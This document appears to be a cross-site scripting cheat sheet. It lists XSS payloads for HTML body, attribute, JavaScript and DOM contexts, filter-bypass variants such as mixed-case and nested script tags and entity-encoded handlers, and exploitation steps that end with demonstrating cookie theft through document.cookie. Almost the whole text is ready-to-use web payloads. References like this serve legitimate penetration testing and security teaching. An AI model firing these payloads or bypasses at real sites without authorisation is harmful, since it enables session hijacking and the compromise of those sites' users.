# Cross-Site Scripting (XSS) — Full Technique Reference

## Detection Payloads

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### Attribute context
```html
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" autofocus onfocus="alert(1)
```

### JavaScript context
```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

### Filter bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert&#40;1&#41;>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
```

### DOM-based (check sources/sinks)
Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`
Sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout`

## Exploitation Steps

1. **Find reflection points**: Inject a unique string (e.g., `xss123test`) and
   search the response for it.
2. **Determine context**: Is input reflected in HTML body, attribute, JavaScript,
   or URL? Each requires different payloads.
3. **Test basic payload**: Try `<script>alert(1)</script>` first.
4. **Bypass filters**: If blocked, identify what's being filtered and use bypass.
5. **Prove impact**: Show cookie theft with `document.cookie` or DOM manipulation.

## Context-specific payloads

| Context | Example payload |
|---|---|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute (double-quoted) | `" onmouseover="alert(1)` |
| HTML attribute (single-quoted) | `' onfocus='alert(1)` |
| JavaScript string | `';alert(1)//` |
| URL/href | `javascript:alert(1)` |
| CSS | `expression(alert(1))` (IE only) |
